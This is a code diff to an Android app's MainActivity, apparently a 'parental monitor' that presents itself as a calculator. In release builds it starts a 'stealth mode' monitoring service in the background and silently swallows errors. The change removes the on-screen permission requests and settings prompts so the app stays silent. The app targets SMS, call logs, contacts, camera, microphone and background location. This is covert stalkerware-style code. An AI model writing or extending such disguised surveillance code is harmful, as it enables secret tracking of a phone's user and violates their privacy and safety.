@@ -6,7 +6,6 @@ import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.redeye.parentalmonitor.R
@@ -17,114 +16,68 @@ import com.redeye.parentalmonitor.BuildConfig
 class MainActivity : AppCompatActivity() {
 
     private lateinit var preferencesManager: PreferencesManager
-    private var permissionAsked = false
-    private var backgroundAsked = false
-    private var settingsRedirected = false
 
-    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-        arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.POST_NOTIFICATIONS,
-            Manifest.permission.CAMERA,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.ACCESS_FINE_LOCATION
-        )
-    } else {
-        arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.CAMERA,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.ACCESS_FINE_LOCATION
-        )
-    }
-
-    private val backgroundPermissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) {
-        if (hasBackgroundLocation()) {
-            Toast.makeText(this, getString(R.string.msg_permissions_granted), Toast.LENGTH_SHORT).show()
-            tryStartAfterPermissions()
-        } else {
-            Toast.makeText(this, getString(R.string.setup_bg_request), Toast.LENGTH_LONG).show()
-        }
-    }
-
-    private fun tryStartAfterPermissions() {
-        if (!::preferencesManager.isInitialized) return
-        if (!BuildConfig.DEBUG && preferencesManager.isConfigured() && preferencesManager.userConsentedMonitoring && !preferencesManager.userDisabledMonitoring && hasBackgroundLocation()) {
-            if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
-                try {
-                    startMonitoringService()
-                    preferencesManager.isMonitoringEnabled = true
-                } catch (e: Exception) {
-                    android.util.Log.e("MainActivity", "Failed to start service: ${e.message}")
-                }
-            }
-        }
-    }
-
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { permissions ->
-        val allGranted = permissions.values.all { it }
-        if (allGranted) {
-            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "All permissions granted")
-            if (!hasBackgroundLocation() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                try {
-                    backgroundPermissionLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                } catch (_: Exception) {
-                    Toast.makeText(this, getString(R.string.setup_bg_request), Toast.LENGTH_LONG).show()
-                }
-            } else {
-                Toast.makeText(this, getString(R.string.msg_permissions_granted), Toast.LENGTH_SHORT).show()
-            }
-            
-            tryStartAfterPermissions()
-            
-        } else {
-            android.util.Log.w("MainActivity", "⚠️ Some permissions denied")
-            Toast.makeText(this, getString(R.string.msg_permissions_denied), Toast.LENGTH_SHORT).show()
-        }
-    }
+    private val requiredPermissions: Array<String>
+        get() = com.redeye.parentalmonitor.utils.AppPermissions.requiredPermissions
 
     override fun onSaveInstanceState(outState: Bundle) {
         super.onSaveInstanceState(outState)
-        outState.putBoolean("permissionAsked", permissionAsked)
-        outState.putBoolean("backgroundAsked", backgroundAsked)
-        outState.putBoolean("settingsRedirected", settingsRedirected)
+        outState.putString("currentNumber", currentNumber)
+        outState.putString("previousNumber", previousNumber)
+        outState.putString("operator", operator)
+        outState.putString("lastExpression", lastExpression)
+        outState.putBoolean("justCalculated", justCalculated)
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        if (savedInstanceState != null) {
-            permissionAsked = savedInstanceState.getBoolean("permissionAsked", false)
-            backgroundAsked = savedInstanceState.getBoolean("backgroundAsked", false)
-            settingsRedirected = savedInstanceState.getBoolean("settingsRedirected", false)
-        }
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "DEBUG mode")
         
-        try { PreferencesManager.refreshInstance(this) } catch (_: Exception) { }
         preferencesManager = PreferencesManager.getInstance(this)
 
         if (!BuildConfig.DEBUG) {
             setContentView(R.layout.activity_calculator)
             initCalculator()
-            startMonitoringInBackground()
+            if (savedInstanceState != null) {
+                currentNumber = savedInstanceState.getString("currentNumber", "")
+                previousNumber = savedInstanceState.getString("previousNumber", "")
+                operator = savedInstanceState.getString("operator", "")
+                lastExpression = savedInstanceState.getString("lastExpression", "")
+                justCalculated = savedInstanceState.getBoolean("justCalculated", false)
+                updateCalculatorDisplay()
+            }
+            try {
+                Thread {
+                    try {
+                        PreferencesManager.refreshInstance(this)
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        preferencesManager = PreferencesManager.getInstance(this)
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        startMonitoringInBackground()
+                    } catch (_: Exception) {
+                    }
+                }.start()
+            } catch (_: Exception) {
+            }
             return
         }
 
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
         setContentView(R.layout.activity_calculator)
         initCalculator()
+        if (savedInstanceState != null) {
+            currentNumber = savedInstanceState.getString("currentNumber", "")
+            previousNumber = savedInstanceState.getString("previousNumber", "")
+            operator = savedInstanceState.getString("operator", "")
+            lastExpression = savedInstanceState.getString("lastExpression", "")
+            justCalculated = savedInstanceState.getBoolean("justCalculated", false)
+            updateCalculatorDisplay()
+        }
     }
     
     // ═══════════════════════════════════════════════════════════
@@ -307,25 +260,15 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startMonitoringInBackground() {
-        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
-        
-        // Check if already configured and has permissions
-        if (!preferencesManager.isConfigured()) {
+        try {
+            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
+            if (!preferencesManager.isConfigured()) {
             android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
             return
         }
         
         if (!hasAllPermissions()) {
-            android.util.Log.w("MainActivity", "Permissions missing - requesting")
-            if (permissionAsked) {
-                redirectToSettingsOnce()
-                return
-            }
-            permissionAsked = true
-            try {
-                permissionLauncher.launch(requiredPermissions)
-            } catch (_: Exception) {
-            }
+            android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
             return
         }
         
@@ -335,18 +278,7 @@ class MainActivity : AppCompatActivity() {
             return
         }
         if (!hasBackgroundLocation()) {
-            android.util.Log.w("MainActivity", "Background location missing - requesting")
-            if (backgroundAsked) {
-                redirectToSettingsOnce()
-                return
-            }
-            backgroundAsked = true
-            try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    backgroundPermissionLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
-                }
-            } catch (_: Exception) {
-            }
+            android.util.Log.w("MainActivity", "Background location missing - staying silent, grant via Setup")
             return
         }
         if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
@@ -360,23 +292,10 @@ class MainActivity : AppCompatActivity() {
         } else {
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
         }
-    }
-    
-    private fun redirectToSettingsOnce() {
-        if (settingsRedirected) return
-        settingsRedirected = true
-        Toast.makeText(this, getString(R.string.msg_permissions_denied), Toast.LENGTH_LONG).show()
-        try {
-            startActivity(
-                Intent(
-                    android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
-                    android.net.Uri.parse("package:$packageName")
-                )
-            )
         } catch (_: Exception) {
         }
     }
-
+    
     private fun hasAllPermissions(): Boolean {
         return requiredPermissions.all { permission ->
             ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
